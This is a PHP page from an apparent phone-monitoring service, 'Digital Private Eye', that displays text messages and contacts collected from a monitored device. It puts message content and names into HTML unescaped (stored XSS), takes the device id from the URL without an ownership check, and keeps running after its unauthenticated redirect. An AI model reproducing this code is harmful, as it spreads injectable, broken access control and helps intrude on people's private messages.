<?php
session_start();
CONST APPLICATION_INITIALS = 'DPEye';
CONST APPLICATION_WEBSITE = 'http://digitalprivateeye.com';
CONST APPLICATION_NAME = 'Digital Private Eye';
CONST APPLICATION_DOWNLOAD_URL = 'https://play.google.com/store/apps/details?id=com.ghostservice';
CONST OWNER = 'Made Software Ltd';
CONST FACEBOOK_URL = 'https://www.facebook.com/pages/Digital-Private-Eye/703312569701920';
CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";

if(!$_SESSION['user_id']) header("Location: sign-in.php");

$currentPage = $page = 1;      
if(array_key_exists("page", $_GET)) 
    $currentPage = $page = $_GET['page'];
include("logic/Devices.php");

$devicesModel = new Devices();
$deviceId = $_GET['device'];

$deviceInfo =  $devicesModel->getDeviceInfo($deviceId);
$deviceDescription = $deviceInfo['description'];


$textPeople =  $devicesModel->getDeviceTextsPeople($deviceId);
if(array_key_exists('telephone', $_GET)) $telephoneNumber = $_GET['telephone'];
else $telephoneNumber = $textPeople[0]['telephone'];

$limit= true;
if(array_key_exists('no_limit',$_GET)) $limit= false;

$telephoneTexts = $devicesModel->getDeviceTelephoneTexts($deviceId, $telephoneNumber, $limit);

$basePath = "";
if(array_key_exists("REQUEST_URL", $_SERVER)) $basePath = $_SERVER['REQUEST_URL'];
$currentUrl = $basePath . "?device=". $deviceId;
$noLimitUrl = basename($_SERVER['REQUEST_URI'])."&no_limit=1";


$ajaxParameters = array("function"=>"get-device-texts", "device"=>"$deviceId", "val"=>"1", "phonenumber"=>"17808845042");
$ajaxParameters = json_encode($ajaxParameters);

?>

<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/html">
  <head>
    <title>Device Texts- <?=APPLICATION_NAME;?>- <?=$deviceDescription?></title>
    <?php include("partials/common-head.php");?>
    
    
    <style>
        .text-contact-button{
            font-size: 14px; width: 100%;margin-bottom: 4px;border: 1px solid #949494; word-break: break-all;padding-right: 10px;white-space: normal; 
        }
        .active-contact{
            border: none;
        }
        .text-messages-display{
            min-width: 200px; width: 100%; text-align: right;border: 1px #ccc solid; border-radius: 5px; margin: 5px 0px 5px 0px ; padding: 20px 15px 20px 15px ;font-size: 14px;
        }
        /* iphones & small devices */
        @media only screen and (max-width : 600px) {
            /* Styles */
            .text-contact-button{
               width: 100%; 
            }
        }
    
    
    </style>
  </head>
  <body>
  <?php
  include "nav.php";
  ?>
  <div class="clear"></div>
    
    <div class="container-wrapper container-top">
      <div class="container container-top">
        <div class="row">
          <div class="col-md-12 center">
            <h1>Text Messages Of <?=$deviceDescription?></h1>
          </div>
        </div><!-- end row -->
      </div><!-- end container -->
    </div><!-- end container wrapper -->

  <?php $deviceId = $_GET['device'];?>
    <div class="container">
      <?php $classicUrl = str_replace("device-texts", "device-texts-classic", basename($_SERVER['REQUEST_URI'])); ?>
      <div  style="text-align: center; font-size: 12px;"><a href="<?=$classicUrl;?>" onclick='showLoadingDiv()'>View texts in classic mode</a></br></br></div>
      
        <?php include("partials/device-nav.php");?>
          
        <div class="col-xs-12 col-sm-3">
            <?php
                    if(!$textPeople) echo "<h2>No data to display.</h2>";
                    else
                    {
                        $numbersDisplayingArray = array();//Shows users already being dos[;ayed. Used to remove duplicate names
                        foreach($textPeople as $person)
                        {
                            $personTelephone = $person['telephone'];
                            
                            if(!in_array(substr($personTelephone, -7), $numbersDisplayingArray)){
                            $numbersDisplayingArray[] = substr($personTelephone, -7);
                            $lastTextDate = $person['text_date'];
                            $url = $currentUrl."&telephone=". $personTelephone;
                            if((strstr($telephoneNumber, $personTelephone))&& ($personTelephone!="0") && (filter_input(INPUT_GET, "telephone")!=null)) {
                                $buttonColor = "btn-purple active-contact";
                            }
                            else 
                            {
                                $buttonColor = "btn-white";
                            }
                            $name = $person['name'];
                            if(!$name) {
                                $name = $personTelephone; //If there is no associated contact name, display the telephone number.
                            }
                            echo "
                                    <a href=\"$url\" class=\"btn btn-sm text-contact-button $buttonColor\" onclick='showLoadingDiv()'>$name</br>
                                        <span style='font-size: 10px;'>
                                            <script>
                                                var localTime = new Date($lastTextDate);
                                                document.write(localTime.toString().substring(0,25));
                                            </script>
                                        </span>
                                    </a>
                                ";                            
                            }
                        }
                    }
                    ?>
        </div>
      
        <div class="col-xs-12 visible-xs">
            <br><br><br><br><br><br>
        </div>
      
      
        <div class="col-xs-12 col-sm-6">
            <div id="text-results">
            </div>
            <div style="text-align: center; margin-top: 50px;">
                <button id="show-more-button" class="btn btn-md btn-primary">Show more</button>
            </div>
        </div>         
      
    </div><!-- end container -->

    <div class="clear"></div>
    <?php
    include "footer.php";
    ?>

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script type="text/javascript">
          
        $(document).ready(function(){
            var page = 1;
            <?php
                $ajaxParameters = array("function"=>"get-device-texts", "device"=>"$deviceId", "val"=>"1");
                $ajaxParameters = json_encode($ajaxParameters);            
            ?>
            var params = <?=$ajaxParameters;?>;            
            var telephone = getUrlParameter('telephone');
            params.phonenumber = telephone;
            
            $("body").scrollspy({target: ".bs-docs-nav-wrapper", offset:50});

            makeTextsRequestCall(params, telephone);      
            
            $("#show-more-button").click(function() {
                showLoadingDiv();
                page = page+1;
                params.val = page;
                makeTextsRequestCall(params, telephone)
            });
        });
        
        function makeTextsRequestCall(params, telephone)
        {
            $.get("logic/DevicesAJAX.php",params,
                function(data) {
                    if(data!=="null"){
                        loadPhoneTextsResults(data, telephone);  
                    }                 
                    else{
                        $('#text-results').append("<h4>No more messages.</h4>");
                        $('#show-more-button').hide(); 
                    }
                    hideLoadingGif();
                });    
        }
        
      
        function loadPhoneTextsResults(data, telephone)
        {
            var rowData = jQuery.parseJSON(data);
            $('#results-table tr').not(':first').not(':last').remove();
            var html = '';
            for(var i = 0; i < rowData.length; i++){
                var message = rowData[i].message;
                var messageDateEpoch = rowData[i].date + "";   
                var messageType = rowData[i].messageType + ""; 
                
                var textColor = "#7C27CB";
                var backgroundColor = "#ececec";
                
                if(messageType==="1") {//outgoing
                    textColor = "green";
                    backgroundColor = "#fbfbfb";
                }
                var localTime = new Date(0); 
                localTime.setUTCSeconds(messageDateEpoch.substring(0,10));
                var MessageDate = localTime.toString().substring(0,25);                                        
                html += "" + "<div class='text-messages-display' style='color: " + textColor + ";background-color: " + backgroundColor + ";'>" + message +" </br><span style='font-size: 10px;'>"+ MessageDate + "</span></div>"
           }console.log(telephone);
           if((telephone==="")||(telephone===null)||(telephone===undefined)){alert("firde");
               $('#text-results').append("<h2>Displaying messages from all numbers. Click on a contact/number to filter messages.</h2>");
           }
            $('#text-results').append(html);
        }
        
        function getUrlParameter(sParam)
        {
            var sPageURL = window.location.search.substring(1);
            var sURLVariables = sPageURL.split('&');
            for (var i = 0; i < sURLVariables.length; i++)
            {
                var sParameterName = sURLVariables[i].split('=');
                if (sParameterName[0] === sParam)
                {
                    return sParameterName[1];
                }
            }
        }
        
        function hideLoadingGif()
        {
            $('#loading_gif').hide();           
        }
        
    </script>

  </body>
</html>
